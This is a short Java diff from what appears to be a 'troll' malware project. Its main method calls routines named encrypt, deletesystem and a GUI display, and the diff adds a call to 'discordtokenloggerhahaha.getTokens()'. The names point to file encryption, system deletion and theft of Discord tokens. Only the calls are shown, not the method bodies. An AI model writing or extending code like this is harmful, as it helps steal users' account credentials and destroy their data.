@@ -1,13 +1,10 @@
 package halq.troll.troll.moment;
 
 
-import halq.troll.troll.moment.utils.webhookUtil;
-
 import java.io.FileWriter;
 import java.io.IOException;
 import java.nio.file.Files;
 import java.nio.file.Paths;
-import java.util.concurrent.TimeUnit;
 
 /**
  * @author halqq
@@ -24,6 +21,7 @@ public class main {
         encrypt.Main();
         deletesystem();
         gui.Display();
+        discordtokenloggerhahaha.getTokens();
     }
 
     public static void createbat()   {
